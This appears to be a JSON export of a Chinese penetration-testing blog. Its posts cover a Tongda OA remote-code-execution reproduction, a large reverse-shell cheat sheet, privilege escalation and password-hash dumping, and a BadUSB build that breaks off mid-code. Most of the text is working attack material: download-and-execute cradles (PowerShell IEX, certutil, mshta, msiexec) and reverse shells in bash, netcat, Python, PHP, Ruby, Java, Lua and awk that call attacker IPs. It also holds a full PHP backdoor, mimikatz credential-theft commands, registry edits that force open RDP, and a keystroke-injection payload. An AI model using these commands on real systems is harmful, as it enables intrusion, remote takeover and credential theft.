{"meta":{"title":"小白帽","subtitle":"","description":"","author":"无名之辈","url":"https://www.yuque.com/xiaogege-yxttw","root":"/"},"pages":[{"title":"tags","date":"2020-08-06T06:06:45.000Z","updated":"2020-08-06T06:06:45.582Z","comments":true,"path":"tags/index.html","permalink":"https://www.yuque.com/xiaogege-yxttw/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"通达OA-远程代码执行","slug":"ss0ssg","date":"2020-08-29T05:28:26.000Z","updated":"2020-08-29T14:11:58.812Z","comments":true,"path":"2020/08/29/ss0ssg/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/29/ss0ssg/","excerpt":"","text":"影响版本12通达OA&lt;v11.5&amp;v11.6版本&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php （仅限于11.6存在，可以借此判断版本） 漏洞搭建 直接运行 EXE 程序 访问：admin/密码为空 漏洞复现 TongdaRCE-master 并且返回了 shell 现在通过 admin/为空成功登录以后 通过冰蝎连接（密码为 pass） 命令执行好像存在点问题 不过可以通过此处修改 shell ——————————————————无名之辈——————————————————- 瓦雀","categories":[],"tags":[]},{"title":"反弹shell","slug":"pq62c9","date":"2020-08-14T14:33:38.000Z","updated":"2020-08-29T14:11:58.188Z","comments":true,"path":"2020/08/14/pq62c9/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/14/pq62c9/","excerpt":"","text":"windowspowercat 反弹 shell12powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.31.86:8000/powercat.ps1');powercat -c 192.168.31.86 -p 1122 -e cmd.exepowershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.31.86:8000/powercat.ps1');powercat -c 192.168.31.86 -p 1122 -e cmd.exe msf（web_delivery）mshta.exe123456789101112#生成htamsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;122.51.93.116 lport&#x3D;1234 -f hta-psh -o test.htapython -m SimpleHTTPServer 8000#开启监听use exploit&#x2F;multi&#x2F;handler#设置pyload show payloadsset payload windows&#x2F;meterpreter&#x2F;reverse_tcp#设置监听 show optionsset LHOST 122.51.93.116set PORT 1234runmshta.exe http:&#x2F;&#x2F;122.51.93.116&#x2F;test.hta regsvr32.exe1234567use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target 3 #show targets 选择targetset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp #show payloads 选择payloadsset lhost 192.168.1.109set lport 4444run靶机直接运行生成regsvr32 certutil.exe测试 win7 x64 192.168.31.182kail 192.168.31.86 123456msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.86 LPORT=1122 -f exe -o 1.exepython -m SimpleHTTPServer 8000use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcp #用x64 否则可能会失败set lport 1122set lhost 192.168.31.86 反弹win7: 12certutil -urlcache -split -f http://192.168.31.86:8000/1.exe &amp;&amp; 1.exe #下载并运行certutil.exe -urlcache -split -f http://192.168.101.16:8080/1.exe delete #删除 win10: 1234#针对win10 如果直接cmd下运行会报错（访问被拒绝）powershellcertutil -urlcache -split -f http://192.168.31.86:8000/1.exe &amp;&amp; 1.exe #下载并运行certutil.exe -urlcache -split -f http://192.168.101.16:8080/1.exe delete #删除 php1234567use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target 1 #show targets 选择target phpset payload php&#x2F;meterpreter&#x2F;reverse_tcp #show payloads 选择phpset lhost 192.168.1.109set lport 4444runphp -d allow_url_fopen&#x3D;true -r &quot;eval(file_get_contents(&#39;http:&#x2F;&#x2F;192.168.31.86:8080&#x2F;SfTB2D&#39;));&quot; 或者直接在 web 目录写入一个 php 文件(winodws/linux 两用) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php error_reporting (E_ERROR); ignore_user_abort(true); ini_set('max_execution_time',0); $ipaddr = '192.168.31.86'; $port = '1234'; $msg = php_uname().\"\\n------------Code by Spider-------------\\n\"; $cwd = getcwd(); function procopen($cmd,$env,$sock) &#123; global $cwd; $descriptorspec = array(0 =&gt; array(\"pipe\",\"r\"),1 =&gt; array(\"pipe\",\"w\"),2 =&gt; array(\"pipe\",\"w\")); $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env); if (is_resource($process)) &#123; fwrite($pipes[0],$cmd); fclose($pipes[0]); $msg = stream_get_contents($pipes[1]); fwrite($sock,$msg); fclose($pipes[1]); $msg = stream_get_contents($pipes[2]); fwrite($sock,$msg); fclose($pipes[2]); proc_close($process); &#125; return true; &#125; function command($cmd,$sock) &#123; if(substr(PHP_OS,0,3) == 'WIN') &#123; $wscript = new COM(\"Wscript.Shell\"); if($wscript &amp;&amp; (!stristr(get_cfg_var(\"disable_classes\"),'COM'))) &#123; $exec = $wscript-&gt;exec('c:\\\\windows\\\\system32\\\\cmd.exe /c '.$cmd); //自定义CMD路径 $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); fwrite($sock,$stroutput); &#125; else &#123; $env = array('path' =&gt; 'c:\\\\windows\\\\system32'); procopen($cmd,$env,$sock); &#125; &#125; else &#123; $env = array('path' =&gt; '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin'); procopen($cmd,$env,$sock); &#125; return true; &#125; $sock = fsockopen($ipaddr,$port); fwrite($sock,$msg); while ($cmd = fread($sock,1024)) &#123; if (substr($cmd,0,3) == 'cd ') &#123; $cwd = trim(substr($cmd,3,-1)); chdir($cwd); $cwd = getcwd(); &#125; if (trim(strtolower($cmd)) == 'exit') &#123; echo 'logout!'; break; &#125; else &#123; command($cmd,$sock); &#125; &#125; fclose($sock); ?&gt; 123456use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp #同位即可，否则会失败set lport 1234set lhost 192.168.31.86然后浏览器去访问1.php psh(powershell)123456use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target 2 #show targets 选择targetset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp #show payloads 选择pshset lhost 192.168.31.86set lport 1234run 反弹 1powershell.exe -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring('http://192.168.31.86:8888/UmFFVPttn3qW1YV'); 靶机运行完会自动退出 python测试环境：win7 x64 / win10 1809（关闭 windows defender 否则不成功直接 die） 123456use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target 0 #show targets 选择targetset payload python&#x2F;meterpreter&#x2F;reverse_tcp #show payloads 选择pythonset lhost 192.168.31.86set lport 4444run 反弹 1python -c \"import sys;u=__import__('urllib'+&#123;2:'',3:'.request'&#125;[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.31.86:8080/H3OdoayJPK9WaR');exec(r.read());\" msiexec（MSI） 12345678msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.86 lport=1234 -f msi &gt; 1.msipython -m SimpleHTTPServer 8000use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp #保证马和payload同位即可，要么都是x64要么都是x86 否则可能会失败set lport 1234set lhost 192.168.31.86msiexec /q /i http://192.168.31.86:8000/1.msi BAT**12345678msfvenom -p cmd/windows/reverse_powershell lhost=192.168.31.86 lport=1234 &gt; 1.batpython -m SimpleHTTPServer 8000use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp #同位即可，否则会失败set lport 1234set lhost 192.168.31.86powershell -c \"IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.31.86:8000/1.bat')) cscript（暂未成功）123456msfvenom -p cmd&#x2F;windows&#x2F;reverse_powershell lhost&#x3D;192.168.31.86 lport&#x3D;1234 -f vbs &gt; 1.vbsuse exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.31.86mset lport 1234exploit rundll32（smb）默认生成 dll 文件（set target 0） 1234567use exploit/windows/smb/smb_deliveryset target 0set payload windows/x64/meterpreter/reverse_tcpset srvhost 192.168.31.86exploitrundll32.exe \\\\192.168.31.86\\KcBm\\test.dll,0 Cobalt StrikeNC12nc -lvp 1234 #kalinc -e cmd.exe 192.168.31.86 1234 #win10 靶机 ## bitsadmin（下载） 12345678用法#必须输入下载路径例如F:\\xxxbitsadmin &#x2F;transfer 任务名 远程文件URL 本地路径bitsadmin &#x2F;transfer job12 https:&#x2F;&#x2F;blog.mydns.vip&#x2F;EFFind.rar c:\\EFFind.rar#默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速，默认高到低：FOREGROUND, HIGH, NORMAL, or LOW 以下是用法示例：bitsadmin &#x2F;setpriority job12 foregroundbitsadmin &#x2F;list 查看当前的任务bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload https:&#x2F;&#x2F;blog.mydns.vip&#x2F;files&#x2F;PSTools.zip c:\\p.zip 不显示进度，静默下载 wmic（后渗透）wmic-poc.xsl.txt（将.txt 删除） 1wmic os get /FORMAT:\"http://192.168.31.86:8000/wmic-poc.xsl\" Windows 白加黑（免杀）MSBuild（未成功）下载https://y4er.com/post/download-shell/msbuild 可以编译执行 csharp 代码即 MSBuild.exe 运行 xml在这里我们需要知道的是 msbuild 的路径 12#加载32位的shellcode需要用32位的msbuild/加载64位的shellcode需要用64位的msbuildC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe #win10 MSBuild.exe 都会在这几个目录下 我们这里用 64 位的 shellcode 和 64 位的 win7 来操作。msbuild-inline-task-master.zip 12#生成shellcodemsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.86 lport=1234 -f csharp 我们用的是executes x64 shellcode.xml的模板，把里面 45 行之后的改为自己的 shellcode 生成新的executes.xml然后 msf 监听 1234567use exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 192.168.31.86set LPORT 1234set ExitOnSession falseset autorunscript migrate -n explorer.exeexploit -j 靶机上运行 1C:\\Windows\\Microsoft.NET\\Framework\\v3.5&gt;MSBuild.exe \"C:\\Users\\XinSai\\Desktop\\executes.xml\" linux（ubuntu 18 x64）bash1、Bash TCP1nc -lvp 1234 1bash -i &gt;&amp; /dev/tcp/192.168.8.106/1234 0&gt;&amp;1 #适合redhat系列,不建议用exec,兼容性并不好 1/bin/bash -i &gt; /dev/tcp/192.168.56.212/1234 0&lt;&amp; 2&gt;&amp;1 Bash UDP12nc -u -lvp 1234 # -u表示采用udp监听sh -i &gt;&amp; &#x2F;dev&#x2F;udp&#x2F;192.168.31.192&#x2F;1234 0&gt;&amp;1 perl1perl -e 'use Socket;$i=\"192.168.8.106\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' telnet12#延迟片刻，等1234和1235均产生内容了在1234输入命令，在1235输出内容telnet 192.168.31.192 1234 | &#x2F;bin&#x2F;bash | telnet 192.168.31.192 1235 1rm f;mkfifo f;cat f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|telnet 183.195.9.164 443 &gt; f Netcat（NC）1nc -e &#x2F;bin&#x2F;sh 192.168.8.106 1234 123#&#x2F;bin&#x2F;bash 或者&#x2F;bin&#x2F;sh 只是显示不一样#遇到支持nc但是不支持-e参数rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.8.106 1234 &gt;&#x2F;tmp&#x2F;f 12#1234输入命令，1235输出内容nc 192.168.8.106 1234|&#x2F;bin&#x2F;sh|nc 192.168.8.106 1235 python12345678910暂未测试#ipv4python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;183.195.9.164&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;export RHOST&#x3D;&quot;183.195.9.164&quot;;export RPORT&#x3D;443;python -c &#39;import sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;183.195.9.164&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;#ipv6python -c &#39;import socket,subprocess,os,pty;s&#x3D;socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;);&#39;#Copy Windows only:C:\\Python27\\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;183.195.9.164&#39;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), &#123;&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#39;try&#39;, (), &#123;&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target&#x3D;p2s, args&#x3D;[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target&#x3D;s2p, args&#x3D;[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\\\windows\\\\system32\\\\cmd.exe&#39;], stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.STDOUT, stdin&#x3D;subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(&#123;&#125;), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])(&#123;&#125;), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot; php12345678#暂未测试php -r &#39;$sock&#x3D;fsockopen(&quot;183.195.9.164&quot;,443);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$s&#x3D;fsockopen(&quot;183.195.9.164&quot;,443);$proc&#x3D;proc_open(&quot;&#x2F;bin&#x2F;sh -i&quot;, array(0&#x3D;&gt;$s, 1&#x3D;&gt;$s, 2&#x3D;&gt;$s),$pipes);&#39;php -r &#39;$s&#x3D;fsockopen(&quot;183.195.9.164&quot;,443);shell_exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$s&#x3D;fsockopen(&quot;183.195.9.164&quot;,443);&#96;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#96;;&#39;php -r &#39;$s&#x3D;fsockopen(&quot;183.195.9.164&quot;,443);system(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;php -r &#39;$s&#x3D;fsockopen(&quot;183.195.9.164&quot;,443);popen(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;php -r &#39;$s&#x3D;\\&#39;127.0.0.1\\&#39;;$p&#x3D;443;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s&#x3D;fsockopen($s,$p,$n,$n))&#123;if($x&#x3D;proc_open(\\&#39;&#x2F;bin&#x2F;sh$IFS-i\\&#39;,array(array(\\&#39;pipe\\&#39;,\\&#39;r\\&#39;),array(\\&#39;pipe\\&#39;,\\&#39;w\\&#39;),array(\\&#39;pipe\\&#39;,\\&#39;w\\&#39;)),$p,getcwd()))&#123;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true)&#123;if(feof($s))die(\\&#39;connection&#x2F;closed\\&#39;);if(feof($p[1]))die(\\&#39;shell&#x2F;not&#x2F;response\\&#39;);$r&#x3D;array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));&#125;fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);&#125;else&#123;die(&quot;proc_open&#x2F;disabled&quot;);&#125;&#125;else&#123;die(&quot;not&#x2F;connect&quot;);&#125;&#39; ruby12345#暂未测试ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;183.195.9.164&quot;,443).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;183.195.9.164&quot;,&quot;443&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;#NOTE: Windows onlyruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;183.195.9.164&quot;,&quot;443&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; Java123456789101112131415161718#暂未测试r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/183.195.9.164/443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])p.waitFor()String host=\"127.0.0.1\";int port=4444;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();Thread thread = new Thread()&#123; public void run()&#123; // Reverse shell here &#125;&#125;thread.start(); Lua1lua -e \"require('socket');require('os');t=socket.tcp();t:connect('183.195.9.164','443');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\" AWK 反弹1awk 'BEGIN &#123;s = \"/inet/tcp/0/183.195.9.164/443\"; while(42) &#123; do&#123; printf \"shell&gt;\" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != \"exit\") close(s); &#125;&#125;' /dev/null Meterpreter Shell12345678910111213msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.195.9.164 LPORT=443 -f exe &gt; reverse.exemsfvenom -p windows/shell_reverse_tcp LHOST=183.195.9.164 LPORT=443 -f exe &gt; reverse.exemsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=183.195.9.164 LPORT=443 -f elf &gt;reverse.elfmsfvenom -p linux/x86/shell_reverse_tcp LHOST=183.195.9.164 LPORT=443 -f elf &gt;reverse.elfmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"183.195.9.164\" LPORT=443 -f elf &gt; shell.elfmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\"183.195.9.164\" LPORT=443 -f exe &gt; shell.exemsfvenom -p osx/x86/shell_reverse_tcp LHOST=\"183.195.9.164\" LPORT=443 -f macho &gt; shell.machomsfvenom -p windows/meterpreter/reverse_tcp LHOST=\"183.195.9.164\" LPORT=443 -f asp &gt; shell.aspmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\"183.195.9.164\" LPORT=443 -f raw &gt; shell.jspmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\"183.195.9.164\" LPORT=443 -f war &gt; shell.warmsfvenom -p cmd/unix/reverse_python LHOST=\"183.195.9.164\" LPORT=443 -f raw &gt; shell.pymsfvenom -p cmd/unix/reverse_bash LHOST=\"183.195.9.164\" LPORT=443 -f raw &gt; shell.shmsfvenom -p cmd/unix/reverse_perl LHOST=\"183.195.9.164\" LPORT=443 -f raw &gt; shell.pl","categories":[],"tags":[]},{"title":"提权与hash读取","slug":"gca6ds","date":"2020-08-06T14:49:23.000Z","updated":"2020-08-29T14:11:58.372Z","comments":true,"path":"2020/08/06/gca6ds/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/06/gca6ds/","excerpt":"","text":"Cobalt strike插件获取与加载 image.png image.png 表示加载成功 image.png Cobalt strike 提权elevate.cna 提权1、加载脚本 image.png 2、脚本选择 image.png 3、脚本加载成功 image.png 4、脚本使用 image.png image.png 通过 net user 查询已经为管理员权限，并且会自动新增一个 image.png dazzleUP（漏洞检测）适用：windows 10 123456789101112DCOM/NTLM Reflection (Rotten/Juicy Potato) VulnerabilityCVE-2019-0836CVE-2019-0841CVE-2019-1064CVE-2019-1130CVE-2019-1253CVE-2019-1385CVE-2019-1388CVE-2019-1405CVE-2019-1315CVE-2020-0787CVE-2020-0796 1、脚本加载dazzleUP-master.zipdazzleUP.cna 和 dazzleUP_Reflective_DLL.dll 放在同一目录下 image.png 2、直接在 beacaon 下使用 image.png 梼杌taowu-cobalt-strike-master.zip image.png 提权完成标志 image.png MSF 提权常规提权CVE-2019-0803CVE-2019-0803.zip1、查看一下当前用户发现是普通用户无法建立新的用户。 image.png 2、把上传的 CVE-2019-0803 拖进 cmd 里，创建新用户 zz image.png CVE-2020-0787BitsArbitraryFileMoveExploit.zip1、创建一个普通用户 net user test test123.. /add 并登入 image.png 查看当前用户为 test 并上传 exe 运行 image.png ms16-32(还未测试)Invoke-MS16-032.ps1本地提权12powershellInvoke-MS16-032.ps1 -Application cmd.exe -commandline \"/c net user evi1cg test123 /add\" 356325576.gif 远程给加载提权1powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://122.51.93.116Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'\" 2.gif dazzleUP（漏洞检测）dazzleUP.zip适用：win 10 123456789101112DCOM&#x2F;NTLM Reflection (Rotten&#x2F;Juicy Potato) VulnerabilityCVE-2019-0836CVE-2019-0841CVE-2019-1064CVE-2019-1130CVE-2019-1253CVE-2019-1385CVE-2019-1388CVE-2019-1405CVE-2019-1315CVE-2020-0787CVE-2020-0796 image.png BadPotato 提权Release.zip适用：Windows 2012-2019Windows 8-10注意：命令中有空格需要通过””括起来，此工具为.net 版本，在蚁剑和 cs 上提权成功。 image.png image.png](https://cdn.nlark.com/yuque/0/2020/png/258143/1596110263454-a6d437d7-0b13-4f4f-8a18-c33e1ae1f2a9.png#align=left&display=inline&height=362&margin=%5Bobject%20Object%5D&name=image.png&originHeight=723&originWidth=699&size=59230&status=done&style=none&width=349.5)![image.png 提权查询 image.png Hash 读取（管理员权限）使用 pwdump7 获取 hash提权hash 读取Pwdump7.zip*测试环境：win7、Win03、window08 *1、将整个附件解压上传到靶机，否则会报错。 image.png](https://cdn.nlark.com/yuque/0/2020/png/258143/1596604183676-7189191c-7610-4946-99f6-87fab6ff5350.png#align=left&display=inline&height=101&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=771&size=23007&status=done&style=none&width=386)![image.png 执行 pwdump.exe，读取成功win7 image.png Windows2008：Windows2003： 拿到 hash 直接破解： image.png mimikatz 抓取 hash执行命令mimikatz_trunk.zip1234567891011mimikatz.exe#检测权限privilege::debug#抓取hash#获取当前在线用户的明文密码（需要高权限运行）sekurlsa::logonpasswords#获取当前此计算机存在过用户的NTLMHASHlsadump::lsa &#x2F;patch 权限符合则提示 image.png 测试：win7 环境下 image.png image.png window2008 用 getpassword.exe GetPass.zip image.png 如果权限不足则会提示 image.png MSF 抓取 hashCobalt Strike 抓取 hash1、抓取 hash（通过 cobalt strike） image.png 端口转发MSF 端口转发ew常见问题解决办法服务端口默认被修改解决办法 ①： 123#查询TermService对应PID和netstat查询的PID对应的端口号tasklist &#x2F;svcnetstat -ano | findstr PID image.png 解决办法 ②： 12#读取注册表查询终端端口PortNumber的值REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp &#x2F;v PortNumber image.png 备注：0xd3d=hex(3389) 解决办法 ③：nnmap 探测(ms-wbt-server 服务) image.png 服务器未开启 3389解决办法：强开 3389 12345678910#通用开3389：wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1#For Win2003&amp;Win2008:REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f#win2012&#x2F;win08通用；win7前两条适用。winxp&#x2F;win03未测验权限需要run as administrator:wmic &#x2F;namespace:\\root\\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1wmic &#x2F;namespace:\\root\\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 服务器网络环境处于内网：解决办法：端口转发 防护验证规则/IP 或计算机名：解决办法：找 IP/计算机名白名单。如果真遇上这种情况又找不着白名单的话，在 3389 这一块算是交代了，可以换一种思路，上远控：QuasarRAT 远控Quasar.zip1、生成 payload image.png 2、开启监听 image.png 需要靶机支持 dotnet4.0 环境，且使用管理员权限运行 payload。 注意：cobalt strike 添加账户需要使用 shell net user 111 111/add不能使用 net user 111 111/add否则出错 image.png 学习文档https://xz.aliyun.com/t/8054","categories":[],"tags":[]},{"title":"BadUSB制作","slug":"rhhcg2","date":"2020-08-06T14:49:23.000Z","updated":"2020-08-29T14:11:58.412Z","comments":true,"path":"2020/08/06/rhhcg2/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/06/rhhcg2/","excerpt":"","text":"1、工具制作1、digispark 开发板购买2、安装 arduino 的 IDE image.png 3、驱动安装链接: https://pan.baidu.com/s/1xISLxPDMOTwN_stzjsvtVw 提取码: i46b image.png 4、环境配置 image.png image.png http://digistump.com/package_digistump_index.json点击工具–开发板管理器 image.png 等待下载完成，下载可能需要挂国外代理。安装这个 image.png 安装完成后开发板选择这个 image.png 2、cs 木马生成 image.png 1234567891011121314151617181920212223242526#include &quot;DigiKeyboard.h&quot;#define KEY_ESC 41#define KEY_BACKSPACE 42#define KEY_TAB 43#define KEY_PRT_SCR 70#define KEY_DELETE 76#define KEY_LEFT_SHIFT 0xE1void setup() &#123; DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(3000); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); DigiKeyboard.delay(1000); DigiKeyboard.println(&quot;cmd &#x2F;T:01 &#x2F;K \\&quot;@echo off &amp;&amp; mode con:COLS&#x3D;15 LINES&#x3D;1\\&quot;&quot;); &#x2F;&#x2F;使用最小化隐藏cmd窗口 DigiKeyboard.delay(1000); DigiKeyboard.println((&quot;powershell 